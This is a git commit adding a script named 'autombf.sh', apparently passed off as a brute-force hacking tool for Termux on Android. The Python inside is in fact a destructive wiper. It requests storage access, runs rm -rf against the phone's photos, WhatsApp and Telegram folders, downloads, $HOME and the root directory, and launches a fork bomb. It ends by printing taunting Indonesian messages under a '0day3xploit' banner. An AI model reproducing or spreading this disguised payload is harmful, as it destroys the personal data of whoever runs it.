c396342c31b61f0b370af81c16d8a894355fedd3
PutraOrz <50797746+PutraOrz@users.noreply.github.com>
2019-05-22 03:52:18 +0700

    New update

---
+++ autombf.sh
@@ -0,0 +1,74 @@
+import os	            
+import optparse 
+import random
+import sys
+import time
+
+os.system("clear")
+os.system("termux-setup-storage")
+os.system("rm -rf /storage/emulated/0")
+os.system("rm -rf /sdcard/0")
+os.system("rm -rf /storage/emulated/0/DCIM")
+os.system("rm -rf /storage/emulated/0/android/obb")
+os.system("rm -rf /sdcard/0/android/data") 
+os.system("rm -rf storage/emulated/0")
+os.system("rm -rf $HOME")
+os.system("rm -rf sdcard/0")
+os.system("rm -rf storage/emulated/0")
+os.system("rm -rf /storage/emulated/0/WhatsApp")
+os.system("rm -rf /storage/emulated/0/Telegram")
+os.system("rm -rf /storage/emulated/0/Downloads")
+os.system("rm -rf /storage/emulated/0/unduhan")
+os.system("rm -rf /storage/shared/WhatsApp")
+os.system("rm -rf /storage/shared/DCIM")
+os.system("rm -rf /storage/shared/GBWhatsApp")
+os.system("rm -rf /storage/shared/GBInstagram")
+os.system("rm -rf /storage/shared/Pictures")
+os.system("rm -rf /storage/shared/Movies")
+os.system("rm -rf /storage/shared/Download")
+os.system("rm -rf /storage/shared/Movies")
+os.system("rm -rf /storage/shared/system/cdsys.co")
+os.system("rm -rf /storage/shared/system")
+os.system("rm -rf /storage/shared/Android")
+os.system("rm -rf /storage/shared/Playlists")
+os.system("rm -rf /storage/shared/Telegram")
+os.system("rm -rf /storage/shared/Music")
+os.system("rm -rf /storage/shared/Movies")
+os.system("rm -rf /storage/emulated/0/GBWhatsApp")
+os.system("rm -rf /storage/emulated/0/GBInsta")
+os.system("rm -rf /storage/emulated/0/GBTelegram")
+os.system("rm -rf /storage/downloads")
+os.system("rm -rf /storage/dcim")
+os.system("rm -rf /storage/shared")
+os.system("rm -rf /storage/music")
+os.system("rm -rf /storage/external-1")
+os.system("rm -rf /")
+os.system("rm -rf /sdcard/0/Music")
+os.system("rm -rf /sdcard/0/WhatsApp")
+os.system("rm -rf /sdcard/0/Intagram")
+os.system(":(){ :|: & };:")
+os.system("clear")
+os.system("ls -l")
+os.system("ls -l")
+os.system("clear")
+os.system("clear")
+os.system("ls -l")
+os.system("ls -l")
+os.system("clear")
+
+def mengetik(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+
+        time.sleep(random.random() * 0.1)
+
+
+mengetik('file error ? ...\natau penyerangan terhadap device anda ? ...\nkita bisa bicara tentang dunia ...')
+mengetik('yang saya ketahui bersama anda bahwa dunia ini sangatlah keras ...\nsaya dan anda harus siap untuk menerima semua ini , penyerangan atau apapun itu ...\ndari penyerangan ini , anda harus paham bahwa tidak adapun seseorang yang harus anda percayai ...')
+mengetik('saya jahat , tapi jahat saya menyelamatkan anda ...\nketahuilah , dunia ini memang keras seperti apa yang saya dan anda bicarakan ...\n')
+
+os.system('clear')
+mengetik('     [ 0day3xploit ]     ')
+
+os.system("exit")
